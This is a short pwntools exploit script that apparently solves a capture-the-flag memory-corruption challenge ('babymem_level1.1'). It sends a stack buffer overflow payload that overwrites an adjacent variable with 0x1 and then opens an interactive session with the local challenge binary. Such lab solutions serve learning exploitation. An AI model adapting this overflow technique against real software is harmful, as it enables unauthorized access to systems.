from pwn import *

# Init
elf = ELF("/challenge/babymem_level1.1")

buffer_length = int("38", 16) #local_38
distance_from_variable_to_win = int("18", 16) #local_18
distance_between_buffer_and_variable = buffer_length - distance_from_variable_to_win

io = elf.process()

# Payload
payload = b"A"*distance_between_buffer_and_variable + p64(0x1) + b"B"*distance_from_variable_to_win + b"B"*8

# Interaction
io.recvuntil("size:")
io.sendline(str(buffer_length))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()